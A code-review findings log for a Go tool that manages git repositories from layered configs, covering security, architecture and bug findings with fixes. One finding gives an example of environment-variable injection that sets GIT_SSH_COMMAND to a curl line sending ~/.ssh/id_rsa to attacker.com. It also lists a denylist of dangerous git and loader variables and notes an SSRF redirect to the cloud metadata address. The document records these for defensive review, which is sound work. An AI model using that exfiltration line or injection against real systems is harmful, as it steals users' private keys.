# Code Review Findings — gorepos

Reviewed: 2026-04-09 (initial), updated 2026-04-09 (deep review), bulk fixes 2026-04-10

---

## Round 2 — SE Team Review (2026-04-12, PR #4 `arch-rev`)

Three specialist agents reviewed the full codebase + PR #4 diff:
- **Security Reviewer** — subprocess/env injection, path traversal, SSRF, URL validation, credential handling
- **Architecture Reviewer** — design quality, package boundaries, concurrency, config loading paths, testability
- **Code Reviewer** — PR #4 diff analysis + all 9 Copilot inline comment verdicts

### Round 2 Summary

| Severity | Count | Source |
|----------|-------|--------|
| CRITICAL | 6 | 3 security + 3 architecture |
| HIGH | 8 | 3 security + 5 architecture + 2 code-review additional |
| MEDIUM | 13 | 5 security + 7 architecture + 1 code-review additional |
| LOW | 3 | code-review |

---

### Security — CRITICAL

#### SEC-C1 — Environment Variable Injection → RCE / Credential Exfiltration

**Status:** Open
**File:** `internal/repository/manager.go:272-280`

`buildEnvironment` merges the entire `Repository.Environment` map verbatim into the subprocess environment for every `git` invocation with zero validation. An attacker who controls a remote include can set `GIT_SSH_COMMAND`, `GIT_PROXY_COMMAND`, or `GIT_EXEC_PATH` to execute arbitrary code when any git operation runs.

**Exploitation:** Remote include defines `environment: { GIT_SSH_COMMAND: "curl -d @~/.ssh/id_rsa https://attacker.com" }` — victim's private key is exfiltrated on `gorepos clone`.

**Fix:** Add a denylist of dangerous git/system env keys (`GIT_SSH_COMMAND`, `GIT_PROXY_COMMAND`, `GIT_EXEC_PATH`, `GIT_ASKPASS`, `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `PATH`) checked in both `buildEnvironment` and `ValidateConfig`. Log and reject blocked keys.

---

#### SEC-C2 — Path Traversal via `repo.Path`

**Status:** Open
**File:** `internal/config/validation.go:96-98`, `internal/repository/manager.go:259-268`

`filepath.Join(basePath, repo.Path)` does not prevent `../../` traversal. `getRepoPath` also returns absolute paths (`filepath.IsAbs(repo.Path)`) with no restriction whatsoever. A remote include can clone into `~/.ssh`, `/etc`, or anywhere on the filesystem.

**Fix:** After `filepath.Join`, verify the resolved path has `basePath` as a prefix. Reject absolute paths from remote includes or constrain them to a permitted root.

---

#### SEC-C3 — No URL Scheme Allowlist for Repository URLs

**Status:** Open
**File:** `internal/config/validation.go:91-93`

URL validation only calls `url.Parse()`, which accepts `file://`, `git://`, and HTTP URLs targeting RFC-1918 / link-local addresses. All reach `git clone` unfiltered.

**Fix:** Allowlist only `https://` and `ssh://` (and SCP-syntax `git@…`). Block `http://`, `file://`, `git://`, and any host resolving to a private/reserved IP range.

---

### Security — HIGH

#### SEC-H1 — Option Injection via `user`/`email` in `git config`

**Status:** Open
**File:** `internal/repository/manager.go:64-69`, `internal/config/validation.go`

`user`/`email` from config are passed as positional args to `git config user.name <value>`. Values starting with `--` are parsed as flags by git (e.g., `--file=/path`, `--unset`, `--remove-section`). `validateUserName`/`validateEmail` exist in `setup.go` but are never called from `ValidateConfig`. Identity spoofing: a remote include can stamp attacker-chosen name/email on commits.

**Fix:** Validate `user`/`email` in `ValidateConfig` and `validatePartialConfig`. Reject values starting with `-`. Propagate errors from `git config` calls instead of discarding with `_`.

---

#### SEC-H2 — SSRF via HTTP Remote Includes (Redirect Following)

**Status:** Open
**File:** `internal/config/loader.go:298-333`

`LoadRemoteConfig` uses `http.Client` with default redirect-following. A trusted config URL can redirect to `http://169.254.169.254/…` (AWS IMDSv1) or internal services.

**Fix:** Set `CheckRedirect: func(...) error { return http.ErrUseLastResponse }`. Block RFC-1918 / link-local IP ranges before fetching.

---

#### SEC-H3 — Identity Validation Structural Gap

**Status:** Open
**File:** `internal/config/validation.go` (missing calls)

`validateUserName`/`validateEmail` are never called from the config loading path. All four code paths — `repositories[].user/email`, `global.credentials.git*`, `includes[].user/email`, `ApplyIncludeIdentity()` — skip content validation.

**Fix:** Wire validators into `ValidateConfig` and `validatePartialConfig` for every identity field.

---

### Architecture — CRITICAL

#### C-1 — Validate-before-defaults in `LoadConfigWithDetails`

**Status:** Open (confirmed by code-review agent as HIGH/confirmed bug)
**File:** `internal/config/loader.go:56-83`

`LoadConfigWithDetails` calls `ValidateConfig` before `setDefaults`. `ValidateConfig` requires `Workers >= 1` and `Timeout >= 1s`, but `setDefaults` is what sets those values. Any config omitting `workers`/`timeout` (the common case) fails validation for `status`, `repos`, `validate`, `groups` commands while `clone`/`update` work fine — split-brain failure mode.

**Fix:** In `LoadConfigWithDetails`, swap call order: `setDefaults` → `applyRootGroupInheritance` → `ValidateConfig`.

---

#### C-2 — Cycle Detection Uses Unstable `include.String()` Key

**Status:** Open (confirmed by code-review agent as MEDIUM)
**File:** `pkg/graph/builder.go:145, 189`

`include.String()` appends identity fields to the key. Two configs forming a cycle with different `user=` values produce different keys — the cycle is missed, causing stack overflow or infinite remote-clone loop.

**Fix:** Use `include.Repo + "@" + include.Ref + ":" + include.GetFile()` as the cycle-detection key (matching the flat loader's approach in `loader.go:256-260`).

---

#### C-3 — Executor Silently Drops Results on Context Cancellation

**Status:** Open
**File:** `internal/executor/pool.go:83-88`

`case <-ctx.Done(): return` in the worker discards the computed result without sending it. Cancelled runs return `nil` error instead of partial error accumulation — silent partial failures on SIGINT or timeout.

**Fix:** Remove the `ctx.Done()` branch from the send select. The channel is sized to `len(operations)`, so the send never blocks under normal use.

---

### Architecture — HIGH

#### H-1 — Two Loading Paths with Different Repo Precedence Semantics

**Status:** Open
**File:** `cmd/gorepos/main.go` vs `internal/commands/helpers.go`

`clone`/`update` use the graph path (last-write-wins). `status`/`repos`/`validate`/`groups` use the flat path (first-write-wins). The same config can produce different effective repository URLs/paths depending on which command runs — silent correctness divergence.

**Fix:** Consolidate on one path. The graph path is architecturally richer; adapt `LoadConfigWithDetails` to derive its result from `BuildGraph`.

---

#### H-2 — `git reset --hard` Destroys Unpushed Local Commits

**Status:** Open
**File:** `internal/repository/manager.go:117-133`

`Update` checks `IsClean` (no uncommitted changes) but not `AheadBehind.Ahead > 0` (unpushed commits). A user with local commits that are clean-but-unpushed loses all work silently.

**Fix:** Replace `reset --hard` with `git pull --ff-only`, or add an explicit `AheadBehind.Ahead > 0` guard before resetting.

---

#### H-3 — `Operation.Context` is a Dead API

**Status:** Open
**File:** `pkg/types/types.go:174`, `internal/executor/pool.go:71`

All callers set `Context: ctx` on `Operation`, but the executor reads its own `execCtx` from `Execute()` and never reads `op.Context`. Per-operation timeouts are impossible; callers populate a meaningless field.

**Fix:** Either remove the field and document pool-wide cancellation, or honour it: use `op.Context` (with fallback to `execCtx`) per operation.

---

#### H-4 — `CredentialConfig` Dead Fields (SSHKeyPath / GitCredHelper / TokenEnvVar)

**Status:** Open
**File:** `pkg/types/types.go:161-167`, `internal/repository/manager.go:272-281`

Three credential fields are accepted by the schema and stored in config but never read during git operations. Users who configure SSH key auth believe it is applied; it is not. `buildEnvironment` only passes `repo.Environment` through.

**Fix:** Implement the fields (inject `GIT_SSH_COMMAND` for `SSHKeyPath`; set credential helper; expand `TokenEnvVar`) or remove them and document reliance on ambient git credential manager.

---

#### H-5 — `extractHierarchyPath` Hardcodes `"configs"` Sentinel

**Status:** Open
**File:** `pkg/graph/builder.go:264-298`

The hierarchy path extraction only works if config files live inside a directory named `"configs"`. Everything else silently returns empty path, breaking group inheritance and `IsInScope` logic.

**Fix:** Remove the hardcoded sentinel. Derive the hierarchy from the include relationship (parent→child path) or make the base directory name configurable.

---

#### H-6 — `GraphQuery` Interface Violates Interface Segregation (25 methods, includes mutations)

**Status:** Open
**File:** `pkg/graph/types.go:142-188`

Any test needing a fake `GraphQuery` must implement all 25 methods including mutation methods (`AddNode`, `RemoveNode`, etc.). Commands that accept `GraphQuery` cannot be unit-tested without building a real graph.

**Fix:** Split into `GraphReader` (query/display methods) and `GraphMutator` (add/remove/build). Commands should accept `GraphReader`.

---

### Architecture — MEDIUM (Selected)

#### M-1 — `GetMergedConfig` Non-Deterministic with Multiple Includes

**File:** `pkg/graph/builder.go:779` — map iteration order randomised; different Level-1 nodes may be selected each run.

#### M-2 — `resolveAzureDevOps` Always Uses `versionType=branch`

**File:** `internal/config/platform.go:144-147` — tag/commit refs return HTTP 400 from ADO Items API.

#### M-3 — `looksLikeCommitHash` Matches Short Hex Branch Names (7-char)

**File:** `internal/config/loader.go:410-420` — `cafebabe`, `deadbeef` etc. trigger wrong clone strategy.

#### M-4 — No Remote Config Caching

**File:** `internal/config/loader.go:340-407` — same repo cloned once per include reference; N×clone latency.

#### M-5 — `ReposCommand` Duplicates Git Execution Logic from `repository.Manager`

**File:** `internal/commands/repos.go:259-344` — two separate porcelain output parsers that must be kept in sync.

#### M-6 — `GetContextRepositoryNames` Is Dead Code with Wrong Filtering Logic

**File:** `internal/commands/helpers.go:83-122` — exported, never called, bidirectional prefix check differs from `FilterRepositoriesByContext`.

#### M-7 — `filterRepositoriesByContext` Wrapper in `main.go` Is a One-Line Pass-Through

**File:** `cmd/gorepos/main.go:179-181` — remove and call `commands.FilterRepositoriesByContext` directly.

---

### Code Review — PR #4 Copilot Comment Verdicts

| # | File | Verdict | Severity |
|---|------|---------|----------|
| 1 | `scripts/build.sh:353` | **REAL BUG** — linker silently ignores unknown symbol; version never injected | LOW |
| 2 | `scripts/build.sh:366` | **REAL BUG** — debug echo to stdout breaks piped consumers | LOW |
| 3 | `internal/config/platform.go:110` | **REAL BUG** — GHES hosts get `raw.githubusercontent.com` URL → 404 | HIGH |
| 4 | `pkg/types/types.go:49` | **NOT PRACTICAL** — yaml.v3 allocates fresh struct per slice element; not exploitable | LOW/INFO |
| 5 | `internal/config/validation.go:99` | **REAL BUG** — compounded by SEC-H1 above | MEDIUM |
| 6 | `internal/config/validation.go:41` | **REAL BUG** — same as C-1; validate before defaults on flat path | HIGH |
| 7 | `pkg/graph/builder.go:191` | **REAL BUG** — same as C-2; cycle evasion via identity-in-key | MEDIUM |
| 8 | `internal/repository/manager.go:69` | **REAL BUG** — errors discarded, identity silently not applied | MEDIUM |
| 9 | `pkg/types/types.go:158` | **DOCS MISMATCH** — Gitea/Forgejo in comment, not in type allowlist | LOW |

### Code Review — Additional Issues (PR #4)

#### CR-H1 — `resolveGitHub` Hardcodes `raw.githubusercontent.com`

**File:** `internal/config/platform.go:110` — ignores `u.Hostname()` entirely. GHES users get 404. **Fix:** Use `u.Hostname()` in the format string (as `resolveGitLab` and `resolveBitbucket` already do).

#### CR-H2 — `resolveAzureDevOps` Always `versionType=branch`

**File:** `internal/config/platform.go:143` — duplicate of M-2 above; tag/commit refs return HTTP 400.

#### CR-M1 — `LoadRemoteConfigViaGit` Has No Context / Timeout

**File:** `internal/config/loader.go:340` — all `exec.Command` calls inside (clone, fetch, checkout) are context-free. Hangs indefinitely on unreachable remote. **Fix:** Add `ctx context.Context` parameter and use `exec.CommandContext`.

---

### Architecture — Strengths (PR #4)

- **`RepositoryManager` interface** — clean, minimal, testable seam for the executor
- **Local cycle detection** uses symlink-resolved absolute paths (handles macOS `/var` → `/private/var`)
- **`IncludeEntry.UnmarshalYAML`** — transparent handling of string vs structured include; excellent UX
- **SHA-256 node IDs** for config nodes — deterministic, content-addressable
- **`ApplyIncludeIdentity` precedence** — repo > include > global; correct override hierarchy
- **`PersistentPreRunE` git binary check** — fails fast with clear message before command execution
- **Buffered channel sized to `len(operations)`** — prevents goroutine leaks in normal path
- **Sparse clone with `--filter=blob:none`** — correct trade-off for config-file fetches
- **`resolveByType` dispatch** with caller-supplied custom platforms before built-in switch — clean extensibility

---


## Test Results (after fixes)

```
ok    internal/config
ok    internal/executor
ok    internal/repository
ok    pkg/graph
?     cmd/gorepos        [no test files]
?     internal/commands   [no test files]
?     internal/display    [no test files]
?     pkg/types           [no test files]
```

---

## Critical

### ~~1. Panic: nil pointer dereference on circular include~~

**Status:** Fixed 2026-04-09

**File:** `internal/config/loader.go:175`

When a circular include is detected, `loadConfigRecursiveWithHierarchy` returns `(nil, nil, error)`. The caller then dereferences `*includedNode` which is nil.

**Fix applied:** Added nil guard before dereferencing `includedNode`.

### ~~2. HTTP client has no timeout~~

**Status:** Fixed 2026-04-09

**File:** `internal/config/loader.go:195`

`http.Get(url)` uses the default client with no timeout.

**Fix applied:** Replaced with `&http.Client{Timeout: 30 * time.Second}`. Also added URL scheme validation and URL in error messages.

### ~~3. Worker pool pre-allocated workers are never used~~

**Status:** Fixed 2026-04-09

**File:** `internal/executor/pool.go`

`start()` created `p.workers` with channels but `Execute()` ignored them entirely, creating ad-hoc goroutines. `Shutdown()` was a no-op.

**Fix applied:** Removed `worker` struct and `start()`. `Execute()` is now the sole goroutine manager. `Shutdown()` cancels via context.

### ~~4. Race condition on workerCount~~

**Status:** Fixed 2026-04-09

**File:** `internal/executor/pool.go:57`

`Execute()` launched a goroutine that read `p.workerCount` after the lock was released.

**Fix applied:** `workerCount` is captured under the lock before launching the goroutine.

### ~~5. Architecture: wire executor pool end-to-end for true parallel operations~~

**Status:** Fixed 2026-04-10 (verified 2026-04-10 — already fully implemented)

**File:** `docs/arch-parallel-executor.md`

The executor pool now has the correct concurrency design (findings 3-4 fixed), but the CLI commands (`runUpdate`, `runClone` in `cmd/gorepos/main.go` and `internal/commands/status.go`) still use **sequential** loops for git operations instead of the parallel executor. The architecture document describes the full end-to-end wiring:

- `runUpdate` / `runClone`: replace sequential `for` loops with `exec.Execute()` + channel drain + `errors.Join`
- `status` command: consume `result.StatusData` from the results channel instead of calling `repoManager.Status()` sequentially in the result loop

**Implementation plan:** See `docs/arch-parallel-executor.md` for full component design, data flow, build sequence, and test strategy.

**Verified:** `executor/pool.go` fully dispatches to `manager.Clone/Update/Status`. All three commands use `exec.Execute()` with buffered result channel drain and `errors.Join`. `types.Result.StatusData` is populated for status ops. Architecture doc matches implementation.

---

## High

### ~~6. Failing tests: ValidateConfig too permissive~~

**Status:** Fixed 2026-04-09

**File:** `internal/config/validation.go`

Five test expectations failed because validation didn't enforce constraints (empty version, workers=0, timeout<1s, empty repos, relative path without basePath).

**Fix applied:** Version required, workers>=1, timeout>=1s, non-empty repos required, relative path needs basePath.

### ~~7. Failing test: setDefaults mismatched expectations~~

**Status:** Fixed 2026-04-09

**File:** `internal/config/merging.go:97-123`

`setDefaults` set `workers=4`, `timeout=30s`, never set version. Tests expected `version="1.0"`, `workers=10`, `timeout=5m`.

**Fix applied:** Updated defaults to `version="1.0"`, `workers=10`, `timeout=5m`.

### ~~8. Failing test: InvalidYAML not detected~~

**Status:** Fixed 2026-04-09

**File:** `internal/config/loader.go`

`yaml.v3` parses arbitrary strings (e.g. `:::not valid yaml:::`) as valid YAML scalars. The loader accepted non-mapping YAML without error.

**Fix applied:** Added pre-parse check that YAML is a mapping, not a bare scalar.

### ~~9. No URL scheme validation for remote configs~~

**Status:** Fixed 2026-04-09 (as part of finding 2)

### ~~10. Error message missing URL context~~

**Status:** Fixed 2026-04-09 (as part of finding 2)

---

## Medium

### 11. No test coverage for major packages

**Status:** Open

| Package | Status |
|---------|--------|
| `cmd/gorepos` | No tests |
| `internal/commands` (7 commands) | No tests |
| `internal/display` (4 renderers) | No tests |
| `pkg/types` | No tests |

### ~~12. build.sh portability on macOS~~

**Status:** Fixed 2026-04-10

**File:** `scripts/build.sh:381`

```bash
info "Output directory: $(realpath "$OUTPUT")"
```

`realpath` may not exist on older macOS. Use `cd "$OUTPUT" && pwd` instead.

### ~~13. Inconsistent path normalization~~

**Status:** Fixed 2026-04-10

Multiple files use `strings.ReplaceAll(path, "\\", "/")` in some places and `filepath` functions in others. On Windows, mixed separators could cause context filtering to fail. Should use `filepath.ToSlash()` consistently.

---

## Low

### 14. No CI/CD pipeline

**Status:** Open

No `.github/workflows/` directory. Tests, linting, and build verification are not automated.

### ~~15. Circular include detection fragile with symlinks~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/loader.go:82-93`

Cycle detection uses `filepath.Abs()` but doesn't resolve symlinks. Two different paths pointing to the same file via symlinks would bypass detection. Could add `filepath.EvalSymlinks()`.

---

## Critical (deep review)

### ~~16. `GetMergedConfig()` never sets `Version` — `LoadConfig()` always fails validation~~

**Status:** Fixed 2026-04-10

**File:** `pkg/graph/builder.go:628–693`

`GetMergedConfig()` constructs a `*types.Config` but never assigns `config.Version`. It stays at the Go zero value `""`. `ValidateConfig` (validation.go:20) rejects any config with empty `Version`, making `config.LoadConfig()` (the documented primary API) broken for every possible input. All CLI commands work around this by using `LoadConfigWithDetails()` instead, so the bug doesn't manifest at runtime today. Any future refactoring toward the graph path will fail immediately.

### ~~17. `GetMergedConfig()` hardcodes `Timeout: 300` (nanoseconds, not seconds)~~

**Status:** Fixed 2026-04-10

**File:** `pkg/graph/builder.go:632`

`time.Duration(300)` = 300 nanoseconds. `ValidateConfig` rejects anything below `time.Second`. If a config file omits `timeout:`, validation fails when routing through the graph path. The legacy path calls `setDefaults()` which assigns `5 * time.Minute` when timeout is zero; `GetMergedConfig()` skips `setDefaults()` and starts at 300 ns instead.

---

## High (deep review)

### ~~18. Graph builder silently breaks URL includes~~

**Status:** Fixed 2026-04-10

**File:** `pkg/graph/builder.go:119–128`

`buildConfigHierarchy` does not check for `http://`/`https://` prefixes before treating the `include` value as a local path — URL strings become mangled local filesystem paths. The legacy loader (`loader.go:150–177`) handles this correctly. Any config using HTTP includes (a documented feature) silently fails on the graph path.

### ~~19. Duplicate repository names across files are a hard error on the graph path~~

**Status:** Fixed 2026-04-10

**File:** `pkg/graph/builder.go:236–238`

Repository node IDs are `fmt.Sprintf("repo_%s", repo.Name)`. If two included files define a repo with the same name (common for overrides), the graph path returns an error. The legacy `mergeConfigs()` silently deduplicates (last-write-wins). Behavioral divergence between the two paths with no documentation.

### 20. Two divergent loading paths — primary graph path broken

**Status:** Open

**File:** `internal/config/loader.go`, `pkg/graph/builder.go`

`LoadConfig()` → `LoadConfigWithGraph()` (graph-based, broken by findings #16–19) vs `LoadConfigWithDetails()` (legacy, working). Every CLI command uses the legacy path. The public API is effectively broken, but this is hidden. The two paths disagree on URL include handling, duplicate repo handling, default value application, and version propagation. `CLAUDE.md` and `copilot-instructions.md` describe the graph path as "for new features" — but it cannot be used until these bugs are fixed.

### 21. Hardcoded vendor-specific org names in context filtering logic

**Status:** Open

**File:** `internal/config/utils.go:257–265, 275–296, 346–378`

`isNodeWithinDirectoryBranch`, `isConfigWithinDirectoryContext`, and `sharesSameBranch` hard-code `"lederworks"`, `"ledermayer"`, `"github"`, and `"azuredevops"` as literal string comparisons against CWD path segments. For any user whose directory structure doesn't contain these strings, context-branch logic silently returns wrong results. This logic belongs in configuration, not baked into source.

### ~~22. `status` command always overrides config `workers` with CLI default~~

**Status:** Fixed 2026-04-10

**File:** `internal/commands/status.go:47–48`

`update` and `clone` correctly guard the flag assignment:
```go
if cmd.Flags().Changed("parallel") { cfg.Global.Workers = workers }
```
`status` does not use this guard, so the `--parallel` default (10) always overwrites the value from the config file. Users cannot control parallelism for `status` via YAML.

---

## Medium (deep review)

### ~~23. `setDefaults()` applied at every include level before merge~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/loader.go:201`

`setDefaults()` is called inside `loadConfigRecursiveWithHierarchy` for each included file (line 201), and then again at root level in `LoadConfigWithDetails` (line 76). Sub-configs get branch defaults (`"main"`) applied before merging, which can incorrectly override a sub-config's explicitly set non-default branch.

### ~~24. `io.ReadAll` without size limit on remote config body~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/loader.go:224`

```go
data, err := io.ReadAll(resp.Body)
```

No `io.LimitReader` guard. A malicious or misconfigured remote URL can stream arbitrary data into memory. Should use `io.LimitReader(resp.Body, maxBytes)`.

### ~~25. Remote config `includes:` silently ignored~~

**Status:** Fixed 2026-04-10 (verified 2026-04-10 — already fully implemented)

**File:** `internal/config/loader.go:208–243`

`LoadRemoteConfig()` unmarshals, applies defaults, and validates — but never processes `config.Includes`. If a remote config itself references further includes (a valid pattern), they are silently ignored. The local recursive loader processes includes correctly. This inconsistency is undocumented.

**Verified:** `loadRemoteConfigWithIncludes()` (lines 240–286) recursively processes remote/HTTP sub-includes from remote configs. Local relative-path sub-includes within remote configs are intentionally skipped (cannot be resolved without local filesystem context) — this is correct behaviour and is commented in the code.

### ~~26. `FileHierarchy[0]` accessed without bounds check~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/utils.go:231`

```go
r.collectContextNodes(r.FileHierarchy[0], ...)
```

`FileHierarchy[0]` is accessed without checking `len(r.FileHierarchy) > 0`. An empty hierarchy (defensive call, future code path) panics. The exported display methods (`display.go:36, 51`) share this same pattern.

### ~~27. `createTagRelationship` / `createLabelRelationship` errors silently discarded~~

**Status:** Fixed 2026-04-10

**File:** `pkg/graph/builder.go:429, 443, 464, 480`

Both functions return `error`. Callers in `processTagsAndLabels` discard all four return values. Duplicate relationship IDs (possible when the same tag/label appears in multiple config files) are silently swallowed.

### ~~28. `git status --porcelain` parsing broken for filenames with spaces~~

**Status:** Fixed 2026-04-10

**File:** `internal/repository/manager.go:141–145`

```go
parts := strings.SplitN(line, " ", 3)
if len(parts) >= 3 {
    status.UncommittedFiles = append(status.UncommittedFiles, strings.TrimSpace(parts[2]))
}
```

`git status --porcelain` format is `XY FILENAME` (two status chars, a space, then the filename starting at column 3). For `"?? my file.txt"`, `SplitN(..., " ", 3)` produces `["??", "my", "file.txt"]` — the filename is truncated. Correct extraction: `line[3:]` (after checking `len(line) >= 3`).

### ~~29. Git calls in `repos.go` use `exec.Command` without context~~

**Status:** Fixed 2026-04-10

**File:** `internal/commands/repos.go:323, 333, 346`

```go
cmd := exec.Command("git", "branch", "--show-current")
```

`repository/manager.go` consistently uses `exec.CommandContext(ctx, ...)`. The `repos` command's git calls have no timeout or cancellation support and can hang indefinitely on slow or network-mounted filesystems.

### ~~30. Repository order non-deterministic after merge~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/merging.go:48–51`

```go
for _, repo := range repoMap { // map iteration order is random
    result.Repositories = append(result.Repositories, repo)
}
```

Repository display order changes between runs. A `sort.Slice` by name should follow the loop.

### ~~31. Three incompatible `filterRepositoriesByContext` implementations~~

**Status:** Fixed 2026-04-10 (verified 2026-04-10 — already fully consolidated)

**Files:** `cmd/gorepos/main.go:175`, `internal/commands/status.go:161`, `internal/commands/repos.go:91`

- `main.go`: graph-based, builds a full `RepositoryGraphImpl`
- `status.go`: string prefix matching with normalized path
- `repos.go`: string prefix matching with extra `TrimSuffix`

All three can disagree on which repos are "in context" for the same CWD. No tests validate consistent behavior across the three.

**Verified:** One canonical implementation exists at `internal/commands/helpers.go:FilterRepositoriesByContext` (lines 45–79) with symlink resolution and normalised slash handling. `main.go:182-185` is a thin wrapper that delegates to it; `status.go` and `repos.go` call it directly. Note: `GetContextRepositoryNames()` in `helpers.go` lines 81–122 is dead code (never called) and should be removed.

---

## Low (deep review)

### ~~32. ~300 lines of dead display functions in `main.go`~~

**Status:** Fixed 2026-04-10

**File:** `cmd/gorepos/main.go:402–689`

`displayGraph`, `displayConfigHierarchy`, `displayTagsAndLabels`, and `displayConfigNode` are defined but never called. `runGraph` delegates to `commands.NewGraphCommand().Execute(...)` which uses `internal/display`. These functions are fully dead code but compile, adding maintenance burden.

### ~~33. `loadConfigWithVerbose` duplicated in four places~~

**Status:** Fixed 2026-04-10

**Files:** `cmd/gorepos/main.go:143`, `internal/commands/status.go:135`, `internal/commands/graph.go:88`, `internal/commands/groups.go:95`

Four independent implementations of identical config-loading boilerplate with slight variations. Should be a shared helper function.

### ~~34. `getContextRepositoryNames` identically duplicated~~

**Status:** Fixed 2026-04-10

**Files:** `internal/commands/graph.go:116`, `internal/commands/groups.go:123`

Two identical implementations. Should move to a shared location (e.g., `internal/commands/context.go`).

### ~~35. Variable shadowing of package-level Cobra command variables~~

**Status:** Fixed 2026-04-10

**File:** `cmd/gorepos/main.go:380, 386, 392, 398`

Local variables `validateCmd`, `reposCmd`, `groupsCmd`, `graphCmd` shadow identically-named package-level Cobra variables. No current bug, but reduces readability and risks future misuse.

### ~~36. Dead duplicate display layer in `internal/config/display.go`~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/display.go`

Four exported methods (`PrintConfigTree`, `PrintConfigTreeWithValidation`, `PrintConfigTreeContext`, `PrintConfigTreeWithValidationContext`) on `*ConfigLoadResult` are never called from any command. Commands use `internal/display.ConfigTreeDisplay` instead. ~530 lines of unreachable code that will drift out of sync.

### ~~37. `nil` error appended and printed as `"Error: <nil>"`~~

**Status:** Fixed 2026-04-10

**File:** `internal/commands/status.go:98–101`

If `result.Success == true` but `result.StatusData == nil`, `result.Error` is nil. The code prints `"Error: <nil>"` and appends nil to `errs`. Harmless to the return value (Go 1.20+ `errors.Join(nil)` returns nil), but confusing UX output.

### ~~38. Redundant double `os.Stat` on `.git` path~~

**Status:** Fixed 2026-04-10

**File:** `internal/repository/manager.go:219–228`

The `Exists()` function calls `os.Stat(gitDir)` twice on the identical path in back-to-back blocks. The logic works accidentally (directory case returns false from first block; file/worktree case returns true from second block), but intent is hidden and the comment misleads.

### ~~39. Group display order non-deterministic~~

**Status:** Fixed 2026-04-10

**File:** `internal/display/groups_tree.go:65–69`

Group names are appended from map iteration (random order) and never sorted before display. `sort.Strings(groupNames)` should be called before the display loop.

### ~~40. `du -h` output format is platform-specific in build script~~

**Status:** Fixed 2026-04-10

**File:** `scripts/build.sh:364`

```bash
size=$(du -h "$output_file" | cut -f1)
```

`du -h` format differs between macOS and GNU coreutils. `wc -c` or `stat` with a platform guard would be more reliable.

---

## High (runtime bugs)

### ~~41. `setup` command ignores `--dry-run` flag — writes files unconditionally~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/setup.go:121` (`RunSetup`), `cmd/gorepos/main.go:113` (flag definition)

The `--dry-run` / `-n` flag is defined as a persistent root flag but `RunSetup()` never receives or checks it. Running `gorepos setup -n` creates the config directory, writes `gorepos.yaml`, and creates the base path directory — all real side effects that should be suppressed in dry-run mode.

**Expected behavior:** In dry-run mode, `setup` should print what it *would* do (config path, base path, generated content) without creating any directories or files.

**Fix:** Pass the `dryRun` bool into `SetupOptions`, check it before `os.MkdirAll` (lines 147, 180) and `os.WriteFile` (line 188), and print the would-be actions instead.

### ~~44. Remote includes lack git ref support — no way to specify branch/tag/commit~~

**Status:** Fixed 2026-04-10

**File:** `pkg/types/types.go`, `internal/config/loader.go`, `internal/config/setup.go`, `internal/config/platform.go`, `pkg/graph/builder.go`, `internal/config/validation.go`

Remote includes only accept raw content URLs. Users cannot specify a repository URL with a branch, tag, or commit ref. Attempting to use a GitHub/Azure DevOps repo URL directly returns HTTP 404 because gorepos does a plain GET on the repo HTML page, not a raw content endpoint.

**Fix:** Changed `includes` from `[]string` to `[]IncludeEntry` with a custom YAML unmarshaler supporting both plain strings (backward compatible) and structured entries with `repo`, `ref`, and `file` fields. Added platform-specific URL resolution for GitHub, Azure DevOps, GitLab, and Bitbucket. The setup wizard auto-detects repo URLs and prompts for ref/file interactively.

---

### ~~43. `setup` conflates init and ongoing config — no guided workflow~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/setup.go`, `cmd/gorepos/main.go`, `internal/config/validation.go`

The `setup` command creates a boilerplate config that immediately fails `validate` ("at least one repository is required") because it has no repos and no includes. Users have no guided way to add config sources after initial setup. The intended workflow is `init` → `setup` → `validate` → `clone` → `status` → `update`, but only `setup` (which does `init`'s job) exists.

**Fix:** Split into two commands:
- `init` — one-time wizard to create `~/.gorepos/gorepos.yaml` with base path, workers, timeout
- `setup` — repeatable wizard to add include paths/URLs to an existing config
- Fix validation to accept configs with includes but no direct repositories

---

### ~~42. Default user config path should be `~/.gorepos/` not `~/.config/gorepos/`~~

**Status:** Fixed 2026-04-10

**File:** `internal/config/setup.go:98–118` (`getDefaultUserConfigPath`), `internal/config/setup.go:48–95` (`getUserConfigPaths`)

On macOS and Linux, `getDefaultUserConfigPath()` returns `~/.config/gorepos/gorepos.yaml`. The user expects `~/.gorepos/gorepos.yaml` as the primary default location. The search order in `getUserConfigPaths()` should also be updated to check `~/.gorepos/` first.

**Fix:**
- `getDefaultUserConfigPath()`: return `~/.gorepos/gorepos.yaml` for macOS and Linux (keep Windows OneDrive/Documents logic)
- `getUserConfigPaths()`: add `~/.gorepos/gorepos.yaml` and `~/.gorepos/gorepos.yml` as the first entries on all platforms (before `~/.config/gorepos/`)


### ~~45. Private remote includes fail; no git availability check; no per-repo git identity~~

**Status:** Fixed 2026-04-10

**Files:** `internal/config/loader.go`, `pkg/graph/builder.go`, `internal/repository/manager.go`, `cmd/gorepos/main.go`, `internal/commands/status.go`, `internal/config/setup.go`, `pkg/types/types.go`, `schemas/repository.schema.yaml`, `schemas/global.schema.yaml`

Three linked issues:

1. **Private remote includes fail with HTTP 403/404** — `repo:` includes fetch config files via HTTP GET on raw content URLs. GitHub/GitLab/Azure DevOps return 403 or 404 for private repos. The host machine already has git authentication (SSH keys, credential manager, PAT helpers), but gorepos bypasses it entirely.

2. **No startup git check** — gorepos is entirely dependent on git but never verifies it's available. Missing git produces obscure errors deep in operation paths instead of a clear message at startup.

3. **No per-repo git identity** — after cloning, each repo uses the global `~/.gitconfig` identity. Users working with multiple identities (personal vs. work) have no way to set `user.name`/`user.email` per-repo through gorepos configuration.

**Fix applied:**

- `LoadRemoteConfigViaGit()` in `loader.go`: fetches remote config files via `git clone --depth=1 --filter=blob:none --no-checkout` + `git sparse-checkout set --no-cone` + `git checkout`. Uses host's existing git authentication. Requires git ≥ 2.25.
- `NewGraphBuilderWithLoaders()` in `builder.go`: adds injectable `repoLoader`/`rawURLLoader` function fields to `GraphBuilder`, breaking the circular import constraint. When nil, remote includes are silently skipped. `internal/config` injects `l.LoadRemoteConfigViaGit` and `l.LoadRemoteConfig` at construction time.
